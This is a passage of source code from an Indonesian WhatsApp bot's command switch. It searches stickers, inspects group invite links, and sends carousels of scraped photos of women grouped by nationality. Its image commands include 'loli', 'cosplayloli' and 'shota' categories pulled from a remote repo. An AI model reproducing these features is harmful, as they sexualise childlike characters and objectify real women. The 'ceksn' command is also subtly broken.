title: $$('#intro > div > div > h1').text(),
author: $$('#intro > div > div > h5 > a').text(),
author_link: $$('#intro > div > div > h5 > a').attr('href'),
sticker: url
})
})
})
})
}
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 5);
if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await KhaerulZx.sendImageAsSticker(m.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
/*case 'stickersearch': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!text) return reply(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
reply(`
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break */
            case 'cekgc': {
            if (banned.includes(m.sender)) {
    return;
    }
            if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
KhaerulZx.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」

▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ ID Group : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us
▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

© ${global.fake}`
try {
pp = await KhaerulZx.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
KhaerulZx.sendFile(from, pp, "", m, { caption: tekse })
})
}
break
 case 'delchat':
 if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Khusus Finsii`)
await KhaerulZx.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, from)
reply('sukses menghapus chat')
break
case 'leagueid': case 'idbahasa': case 'kodebahasa':{
if (banned.includes(m.sender)) {
    return;
    }
reply(`*❲ COUNTRY ID ❳*
    ⏣ •  af: Afrikaans 
    ⏣ •  sq: Albanian
    ⏣ •  ar: Arabic
    ⏣ •  hy: Armenian
    ⏣ •  ca: Catalan 
    ⏣ •  zh: Chinese 
    ⏣ •  zh-cn: Chinese (Mandarin/China)
    ⏣ •  zh-tw: Chinese (Mandarin/Taiwan)
    ⏣ •  zh-yue: Chinese (Cantonese)
    ⏣ •  hr: Croatian
    ⏣ •  cs: Czech
    ⏣ •  da: Danish
    ⏣ •  nl: Dutch
    ⏣ •  en: English    
    ⏣ •  en-au: English (Australia)
    ⏣ •  en-uk: English (United Kingdom)
    ⏣ •  en-us: English (United States) 
    ⏣ •  eo: Esperanto 
    ⏣ •  fi: Finnish 
    ⏣ •  fr: French
    ⏣ •  de: German
    ⏣ •  el: Greek 
    ⏣ •  ht: Haitian Creole 
    ⏣ •  hi: Hindi 
    ⏣ •  hu: Hungarian 
    ⏣ •  is: Icelandic 
    ⏣ •  id: Indonesian 
    ⏣ •  it: Italian
    ⏣ •  ja: Japanese
    ⏣ •  ko: Korean
    ⏣ •  la: Latin
    ⏣ •  lv: Latvian
    ⏣ •  mk: Macedonian
    ⏣ •  no: Norwegian
    ⏣ •  pl: Polish
    ⏣ •  pt: Portuguese
    ⏣ •  pt-br: Portuguese (Brazil)
    ⏣ •  ro: Romanian
    ⏣ •  ru: Russian
    ⏣ •  sr: Serbian
    ⏣ •  sk: Slovak
    ⏣ •  es: Spanish 
    ⏣ •  es-es: Spanish (Spain)
    ⏣ •  es-us: Spanish (United States)
    ⏣ •  sw: Swahili
    ⏣ •  sv: Swedish
    ⏣ •  ta: Tamil
    ⏣ •  th: Thai
    ⏣ •  tr: Turkish
    ⏣ •  vi: Vietnamese 
    ⏣ •  cy: Welse`)
}
break
case 'cecanindo': {
if (banned.includes(m.sender)) {
    return;
    }
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek cantik Indonesia');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanjepang': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek jepang');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanmalaysia': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek malaysia');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanhijaber': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek hijab cantik');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanchina': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('Chinese girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] 
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanvietnam': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('Vietnamese girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] 
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecankorea': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('Korean girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecan': {
if (banned.includes(m.sender)) {
    return;
    }

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('beautiful girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] 
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================//
//



//
const serialUser = createSerial(20) 
case 'ceksn':
if (banned.includes(m.sender)) {
    return;
    }
m.reply(`SN : ${serialUser}`)
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elena': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga1': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
reply("Gambar Akan Dikirim Lewat Private Chat")
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga1/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
